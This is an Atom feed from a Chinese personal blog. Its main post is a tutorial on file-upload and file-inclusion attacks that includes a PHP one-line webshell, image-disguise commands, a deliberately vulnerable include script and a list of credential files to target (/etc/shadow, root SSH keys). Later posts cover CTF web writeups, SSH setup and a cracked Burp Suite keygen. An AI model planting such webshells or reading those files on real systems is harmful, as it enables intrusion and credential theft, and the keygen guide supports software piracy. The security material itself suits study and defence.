    <content type="html"><![CDATA[<h2 id="上传文件校验"><a href="#上传文件校验" class="headerlink" title="上传文件校验"></a>上传文件校验</h2><ul><li>客户端javascript校验（一般只校验后缀名）</li><li>服务端校验<ul><li>文件头content-type字段校验（image/gif）</li><li>件内容头校验（GIF89a）</li><li>后缀名黑名单校验</li><li>后缀名白名单校验</li><li>自定义正则校验</li></ul></li><li>WAF设备校验（根据不同的WAF产品而定</li></ul><h3 id="php文件上传过程黑名单、白名单认证"><a href="#php文件上传过程黑名单、白名单认证" class="headerlink" title="php文件上传过程黑名单、白名单认证"></a>php文件上传过程黑名单、白名单认证</h3><p>此文可以参考<em><a href="https://blog.csdn.net/hitwangpeng/article/details/47060671" target="_blank" rel="noopener">https://blog.csdn.net/hitwangpeng/article/details/47060671</a></em><br>黑名单绕过可以测试，如<br><code>1.aaa，1.php3,1.php4</code>等进行测试</p><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><h3 id="Burpsuite改包"><a href="#Burpsuite改包" class="headerlink" title="Burpsuite改包"></a>Burpsuite改包</h3><ul><li><p>0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候</p><ul><li>上传文件为1.php，在burpsuite将其改为1.php+，发送到repeate，+号的十六进制为2d，在hex里面将其改为00，截断，点GO</li><li>上传文件为1.php.jpg，将jpg前面的.的十六进制（2e）改为00</li></ul></li><li><p>上传一句话木马，1.php；<code>&lt;?php eval($_POST[&quot;xxx&quot;]);?&gt;</code>，在Burpsuite里面将其文件名改为1.jpg，还有将content-type字段改为image/jpg；</p></li></ul><h3 id="图片木马"><a href="#图片木马" class="headerlink" title="图片木马"></a>图片木马</h3><ul><li>Windows下制作图片一句话木马php写入图片<br><code>copy 1.jpg/b+2.php/a  New.jpg</code></li><li>Linux下<br><code>cat 1.jpg 2.php &gt; new.jpg</code><br>点击上传，<code>http://localhost/upload/upload.html</code><br>上传成功后，使用文件包含程序，将jpg文件进行解析<br><code>http://localhost/upload/1.php?page=./uploads/h.jpg</code><br>?paragam(参数)=图片的绝对路径<br>此时上传成功，php程序一句被即解析，本页面只会显示图片的源码，而不显示php程序，此时查看源代码php程序已经被注释<br>接下来可以使用菜刀连接&nbsp;刚刚的网址，密码是php程序里面写入的参数<br>1.php</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&quot;page&quot;]))&#123;</span><br><span class="line">include $_GET[&quot;page&quot;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">include &apos;2.php&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>2.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;niaho&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h6 id="敏感文件："><a href="#敏感文件：" class="headerlink" title="敏感文件："></a>敏感文件：</h6><p>1、Windows：<br>C:boot.ini //查看系统版本<br>C:WindowsSystem32inetsrvMetaBase.xml //IIS配置文件<br>C:Windowsrepairsam //存储系统初次安装的密码<br>C:Program Filesmysqlmy.ini //Mysql配置<br>C:Program Filesmysqldatamysqluser.MYD //Mysql root<br>C:Windows\php.ini //php配置信息<br>C:Windows\my.ini //Mysql配置信息</p><p>2、Linux：<br>/root/.ssh/authorized_keys<br>/root/.ssh/id_rsa<br>/root/.ssh/id_ras.keystore<br>/root/.ssh/known_hosts<br>/etc/passwd<br>/etc/shadow<br>/etc/my.cnf<br>/etc/httpd/conf/httpd.conf<br>/root/.bash_history<br>/root/.mysql_history<br>/proc/self/fd/fd[0-9]*(文件标识符)<br>/proc/mounts<br>/porc/config.gz</p><p>###<br>文件包含漏洞详解，转自<em><a href="https://blog.csdn.net/chence19871/article/details/51906523" target="_blank" rel="noopener">https://blog.csdn.net/chence19871/article/details/51906523</a></em><br>web安全文件包含漏洞，转自<em><a href="https://blog.csdn.net/hitwangpeng/article/details/45952625" target="_blank" rel="noopener">https://blog.csdn.net/hitwangpeng/article/details/45952625</a></em><br>绕过姿势<em><a href="https://thief.one/2017/04/10/2/" target="_blank" rel="noopener">https://thief.one/2017/04/10/2/</a></em><br><em><a href="https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/" target="_blank" rel="noopener">https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/</a></em></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;上传文件校验&quot;&gt;&lt;a href=&quot;#上传文件校验&quot; class=&quot;headerlink&quot; title=&quot;上传文件校验&quot;&gt;&lt;/a&gt;上传文件校验&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;客户端javascript校验（一般只校验后缀名）&lt;/li&gt;
&lt;li&gt;服务端校验&lt;ul&gt;
&lt;li
      
    
    </summary>
    
      <category term="Security" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Security/"/>
    
    
      <category term="文件包含漏洞" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>ssh远程连接Linux</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/04/07/%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5Linux/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/04/07/远程连接Linux/</id>
    <published>2018-04-07T04:54:05.000Z</published>
    <updated>2018-04-07T10:00:55.674Z</updated>
    
    <content type="html"><![CDATA[<p>首先,确定是否有安装SSH服务<br>命令：<code>ps -e | grep ssh*</code><br>如果没有任何显示,则没有安装该服务<br>其次,安装SSH-server<br><code>sudo apt-get install openssh-server</code><br>接着,更重要的是安装SSH-client<br><code>sudo apt-get install openssh-client</code><br>确认安装SSH服务成功与否<br><code>ps -e | grep ssh*</code><br>如果,看到sshd表明ssh-server启动了;</p><h2 id="服务器端设置ssh免密"><a href="#服务器端设置ssh免密" class="headerlink" title="服务器端设置ssh免密"></a>服务器端设置ssh免密</h2><p>首先Linux要配置好ssh免密连接<br><code>cd /root/.ssh/</code><br>如果没有此文件，可以先使用<code>ssh localhost</code><br>之后便可以进入.ssh文件<br>ls查看<br>只有这一个文件,<code>known_hosts</code><br>先在本机生成公钥和私钥, <code>ssh-keygen -t rsa</code><br>将公钥写入认证里面,<code>cat ./id_rsa.pub &gt;&gt; ./authorized_keys</code><br>修改文件<code>authorized_keys</code>权限为600,<code>chmod 600 .ssh/authorized_keys</code><br>至此，ssh免密已经配置好了，上述步骤如下<br><img src="https://upload-images.jianshu.io/upload_images/9464729-caa958e67eb90366.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="ssh"></p><h3 id="使用Xshell免密远程连接linux"><a href="#使用Xshell免密远程连接linux" class="headerlink" title="使用Xshell免密远程连接linux"></a>使用Xshell免密远程连接linux</h3><p>转自<em><a href="https://www.linuxidc.com/Linux/2015-03/114947.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2015-03/114947.htm</a></em><br>补充网址里面的第六步：<br>复制生成的公钥到linux可以直接将本地<code>id_rsa_2048.pub</code>直接复制过去,将其放入<code>/root/.ssh/</code>文件夹下，使用此命令写入认证<code>cat ./id_rsa_2048.pub &gt;&gt; ./authorized_keys</code><br>此时再按照上面的网址操作即可</p><h3 id="使用cmder免密连接linux"><a href="#使用cmder免密连接linux" class="headerlink" title="使用cmder免密连接linux"></a>使用cmder免密连接linux</h3><p>先在本机生成公钥和私钥, <code>ssh-keygen -t rsa</code><br>将生成的<code>id_rsa.pub</code>重命名为<code>id_rsa0.pub</code>(因为linux下一句有一个与此同名的文件),上传至服务器;<br>window下生成的<code>id_rsa.pub</code>存放于<code>C:\Users\用户名\.ssh</code>下<br>将其放入<code>/root/.ssh/</code>文件夹下;<br>使用此命令写入认证<code>cat ./id_rsa0.pub &gt;&gt; ./authorized_keys</code><br>此时Cmder连接linux已经免密了</p><h3 id="PS："><a href="#PS：" class="headerlink" title="PS："></a>PS：</h3><p>使用ssh连接，关闭linux系统防火墙才可连接，关闭防火墙命令<code>service iptables stop</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;首先,确定是否有安装SSH服务&lt;br&gt;命令：&lt;code&gt;ps -e | grep ssh*&lt;/code&gt;&lt;br&gt;如果没有任何显示,则没有安装该服务&lt;br&gt;其次,安装SSH-server&lt;br&gt;&lt;code&gt;sudo apt-get install openssh-server
      
    
    </summary>
    
      <category term="Linux" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Destiny</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/04/05/Destiny/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/04/05/Destiny/</id>
    <published>2018-04-05T13:04:39.000Z</published>
    <updated>2018-04-05T13:59:31.794Z</updated>
    
    <content type="html"><![CDATA[<p>&nbsp;&nbsp;成功正因我志在成功！成功呈概率分布，关键是你能不能坚持到成功开始呈现的那一刻。<br><br><br>&nbsp;&nbsp;人生的路上，我们都在奔跑，我们总在赶超一些人，也总在被一些人超越。人生的要义，一是欣赏沿途的风景，二是抵达遥远的终点。人生的秘诀，就在于寻找一种最适合自己的速度，莫因疾进而不堪重荷，莫因迟缓而空耗生命。人生的快乐，就是走自己的路，看自己的景。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&amp;nbsp;&amp;nbsp;成功正因我志在成功！成功呈概率分布，关键是你能不能坚持到成功开始呈现的那一刻。&lt;br&gt;&lt;br&gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;人生的路上，我们都在奔跑，我们总在赶超一些人，也总在被一些人超越。人生的要义，一是欣赏沿途的风景，二是抵达遥远的终点。人生的
      
    
    </summary>
    
      <category term="Daily" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Daily/"/>
    
    
      <category term="Daily" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Daily/"/>
    
  </entry>
  
  <entry>
    <title>Burpsuite抓取收据数据包</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/04/05/Burpsuite%E6%8A%93%E5%8F%96%E6%94%B6%E6%8D%AE%E6%95%B0%E6%8D%AE%E5%8C%85/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/04/05/Burpsuite抓取收据数据包/</id>
    <published>2018-04-05T12:51:52.000Z</published>
    <updated>2018-05-13T07:20:08.834Z</updated>
    
    <content type="html"><![CDATA[<p>首先给手机导入crt证书，电脑证书为der格式，直接修改后缀为crt格式即可，此链接已经改好了<br>网盘下载:<em><a href="https://pan.baidu.com/s/1JmdjJ1VO40Vjv0a2OkGVNw" target="_blank" rel="noopener">https://pan.baidu.com/s/1JmdjJ1VO40Vjv0a2OkGVNw</a></em> &nbsp;密码：<code>6bs8</code><br>电脑和手机要处于同一个网络，手机WIFI设置好代理及端口，使用Burpsuite进行抓包分析，使用手机访问想要抓取的网站或App里面某一功能，<code>Burpsuite</code>的<code>history</code>里面有记录，可进行分析<br><a href="https://www.cnblogs.com/nieliangcai/p/6689915.html" target="_blank" rel="noopener">Burpsuite使用教程</a>,此处需要知道重放包的使用以及history即可<br>此处举例：<a href="https://zhuanlan.zhihu.com/p/35268895?utm_source=qq&amp;utm_medium=social" target="_blank" rel="noopener">坦白说</a><br>&nbsp;&nbsp;QQ新出的坦白说功能，抓取到的页面<code>Host</code>应为<code>ti.qq.com</code>，抓取到的数据为加密类型，<a href="https://jackz.cn/article/qq_honestsay" target="_blank" rel="noopener">解密网址</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;首先给手机导入crt证书，电脑证书为der格式，直接修改后缀为crt格式即可，此链接已经改好了&lt;br&gt;网盘下载:&lt;em&gt;&lt;a href=&quot;https://pan.baidu.com/s/1JmdjJ1VO40Vjv0a2OkGVNw&quot; target=&quot;_blank&quot; rel
      
    
    </summary>
    
      <category term="Tools" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Tools/"/>
    
    
      <category term="Tools" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Tools/"/>
    
      <category term="Security" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>CTF-Web</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/04/05/CTF-Web/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/04/05/CTF-Web/</id>
    <published>2018-04-05T08:51:13.000Z</published>
    <updated>2018-05-13T07:20:29.464Z</updated>
    
    <content type="html"><![CDATA[<p>1、md5 collision，<a href="http://chinalover.sinaapp.com/web19/" target="_blank" rel="noopener">传送参数</a>，函数如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$md51 = md5(<span class="string">'QNKCDZO'</span>);</span><br><span class="line">$a = @$_GET[<span class="string">'a'</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line"><span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"nctf&#123;*****************&#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"false!!!"</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">"please input a"</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>这个题目如果知道MD5碰撞的概念，同时知道了在PHP中的MD5中的0e的比较，这道题目就十分的简单。<br>如果md的值是以0e开头的，那么就与其他的0e开头的Md5值是相等的。<br>例子如下，其他符合/0[eE]\d{30}/的MD5值：</p><table><thead><tr><th>原码</th><th style="text-align:right">md5</th></tr></thead><tbody><tr><td>QNKCDZO</td><td style="text-align:right">0e830400451993494058024219903391</td></tr><tr><td>s878926199a</td><td style="text-align:right">0e545993274517709034328855841020</td></tr><tr><td>s155964671a</td><td style="text-align:right">0e342768416822451524974117254469</td></tr><tr><td>s1502113478a</td><td style="text-align:right">0e861580163291561247404381396064</td></tr><tr><td>s214587387a</td><td style="text-align:right">0e848240448830537924465865611904</td></tr><tr><td>s878926199a</td><td style="text-align:right">0e545993274517709034328855841020</td></tr><tr><td>s1091221200a</td><td style="text-align:right">0e940624217856561557816327384675</td></tr><tr><td>s1885207154a</td><td style="text-align:right">0e509367213418206700842008763514</td></tr><tr><td>s1836677006a</td><td style="text-align:right">0e481036490867661113260034900752</td></tr><tr><td>s1184209335a</td><td style="text-align:right">0e072485820392773389523109082030</td></tr><tr><td>s1665632922a</td><td style="text-align:right">0e731198061491163073197128363787</td></tr><tr><td>s532378020a</td><td style="text-align:right">0e220463095855511507588041205815</td></tr><tr><td>240610708</td><td style="text-align:right">0e462097431906509019562988736854</td></tr></tbody></table><p>2、<a href="view-source:http://chinalover.sinaapp.com/web3/" target="_blank" rel="noopener">层层递进</a><br>查看源代码，最下面发现有子网站，直到最后找到404.html,发现注释里面存在flag<br><img src="https://upload-images.jianshu.io/upload_images/9464729-add6f3eb7717bb38.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="flag"><br>3、JS<br><a href="http://chinalover.sinaapp.com/web20/aaencode.txt" target="_blank" rel="noopener">AAencode</a><br>代码报错，未定义的字符，修改一下，在控制台里面运行一下即可，关于<a href="http://www.cnblogs.com/Wayou/p/chrome-console-tips-and-tricks.html" target="_blank" rel="noopener">控制台指南</a><br><img src="https://upload-images.jianshu.io/upload_images/9464729-d72acf9259b0713f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="JS"><br>4、<a href="http://chinalover.sinaapp.com/web8/" target="_blank" rel="noopener">单身二十年</a><br>使用Burpsuite抓包，发history里面藏着一个search_key.php，查看response，出现flag<br>5、<a href="http://chinalover.sinaapp.com/web22/" target="_blank" rel="noopener">Are you from google?</a><br>修改referer为 <a href="https://www.google.com" target="_blank" rel="noopener">https://www.google.com</a><br>提供一个<a href="https://blog.csdn.net/linhaiman/article/details/7025336" target="_blank" rel="noopener">http头部字段详解</a><br>6、php decode<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CLsI</span><span class="params">($ZzvSWE)</span> </span>&#123;</span><br><span class="line">    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($ZzvSWE); $i++) &#123;</span><br><span class="line">        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $ZzvSWE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(CLsI(<span class="string">"+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><a href="http://www.cnblogs.com/xiaochaohuashengmi/archive/2010/09/17/1829166.html" target="_blank" rel="noopener">eval函数详解</a><br>上述代码最后一行eval改为echo放入本地运行即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1、md5 collision，&lt;a href=&quot;http://chinalover.sinaapp.com/web19/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;传送参数&lt;/a&gt;，函数如下：&lt;br&gt;&lt;figure class=&quot;highlight 
      
    
    </summary>
    
      <category term="CTF" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/CTF/"/>
    
    
      <category term="Web-WriteUp" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Web-WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>安装Burpsuite1.7.31</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/04/05/%E5%AE%89%E8%A3%85Burpsuite1-7-31/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/04/05/安装Burpsuite1-7-31/</id>
    <published>2018-04-05T05:41:05.000Z</published>
    <updated>2018-04-05T05:42:04.372Z</updated>
    
    <content type="html"><![CDATA[<p>起码要有一个<code>Burpsuite</code>的安装包，<a href="https://pan.baidu.com/s/1zGngNs71eUhC5gSRgiWLrg" target="_blank" rel="noopener">下载链接</a> 密码：<code>zgcx</code><br>zip里面有两个文件<br>首先打开<code>burp-loader-keygen.jar</code>，点击右上角的<code>Run</code><br><img src="https://upload-images.jianshu.io/upload_images/9464729-a7873c51f4c00444.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图一"><br>接着会出现<br><img src="https://upload-images.jianshu.io/upload_images/9464729-f231e4dd9a736ee0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图二"><br><img src="https://upload-images.jianshu.io/upload_images/9464729-770938421718989d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图三"><br>将图三红色框内的License序列号复制到图二里面，点击右下角的<code>Next</code>，进入图五，点击<code>Manual activation</code><br><img src="https://upload-images.jianshu.io/upload_images/9464729-d3cca93b9ac7ffb4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图四"><br><img src="https://upload-images.jianshu.io/upload_images/9464729-ffa7f00dddcfe19e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图五"><br>点击图五里面的<code>Copy request</code>，进入图一，粘贴到此处<br><img src="https://upload-images.jianshu.io/upload_images/9464729-8ed8dabc151b83fb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图六"><br><img src="https://upload-images.jianshu.io/upload_images/9464729-04b75f69a7c0b32a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图七"><br>粘贴完后，出现红色框内的序列号，复制到图五的<code>Paste response</code>里面，点击Next，至此安装已经完成<br><img src="https://upload-images.jianshu.io/upload_images/9464729-63d0ad23c6d5b1cf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图八"><br>以后每次使用时双击<code>burp-loader-keygen.jar</code>，点击右上角的<code>Run</code>即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;起码要有一个&lt;code&gt;Burpsuite&lt;/code&gt;的安装包，&lt;a href=&quot;https://pan.baidu.com/s/1zGngNs71eUhC5gSRgiWLrg&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;下载链接&lt;/a&gt; 密码：&lt;co
      
    
    </summary>
    
      <category term="Tools" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Tools/"/>
    
    
      <category term="Tools" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>hexo</title>
    <link href="https://github.com/hjyApple/hjyApple.github.io/2018/04/02/hexo/"/>
    <id>https://github.com/hjyApple/hjyApple.github.io/2018/04/02/hexo/</id>
    <published>2018-04-02T05:55:05.000Z</published>
    <updated>2018-05-13T07:21:13.732Z</updated>
    
    <content type="html"><![CDATA[<h3 id="hexo-next主题配置"><a href="#hexo-next主题配置" class="headerlink" title="hexo next主题配置"></a>hexo next主题配置</h3><p>本站采用Misc风格，主题背景默认的，不过颜色可以自己设置，新建一个tags标签，<code>hexo new page tags</code>，此时会在本地创建一个tags文件夹<br>,想让侧栏出现tags和分类，只需将这个弄好就OK了</p><h3 id="添加本地搜索"><a href="#添加本地搜索" class="headerlink" title="添加本地搜索"></a>添加本地搜索</h3><h3 id="安装hexo-generator-searchdb"><a href="#安装hexo-generator-searchdb" class="headerlink" title="安装hexo-generator-searchdb"></a>安装hexo-generator-searchdb</h3><p><code>npm install hexo-generator-searchdb --save</code></p><h3 id="修改站点配置文件"><a href="#修改站点配置文件" class="headerlink" title="修改站点配置文件"></a>修改站点配置文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br></pre></td></tr></table></figure><h3 id="修改主题配置文件"><a href="#修改主题配置文件" class="headerlink" title="修改主题配置文件"></a>修改主题配置文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># Local search</span><br><span class="line">local_search:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure><h3 id="接入网易云音乐"><a href="#接入网易云音乐" class="headerlink" title="接入网易云音乐"></a>接入网易云音乐</h3><p>进入网易云音乐官网，搜索想要的歌曲，生成外链接，复制此代码到<code>/hexo/themes/next/layout/_macro/sidebar.swig</code>，复制到112行</p><p>每次修改完成后先 <code>heco clean</code>,再<code>hexo d -g</code>即可发布</p><p>插入一句Markdownpad使用，使用时修改选项为commonMark;</p><h4 id="一篇文章使用多个标签"><a href="#一篇文章使用多个标签" class="headerlink" title="一篇文章使用多个标签"></a>一篇文章使用多个标签</h4><pre><code>tags：- 标签1- 标签2</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;hexo-next主题配置&quot;&gt;&lt;a href=&quot;#hexo-next主题配置&quot; class=&quot;headerlink&quot; title=&quot;hexo next主题配置&quot;&gt;&lt;/a&gt;hexo next主题配置&lt;/h3&gt;&lt;p&gt;本站采用Misc风格，主题背景默认的，不过颜色可以自
      
    
    </summary>
    
      <category term="Blog" scheme="https://github.com/hjyApple/hjyApple.github.io/categories/Blog/"/>
    
    
      <category term="Github+next" scheme="https://github.com/hjyApple/hjyApple.github.io/tags/Github-next/"/>
    
  </entry>
  
</feed>
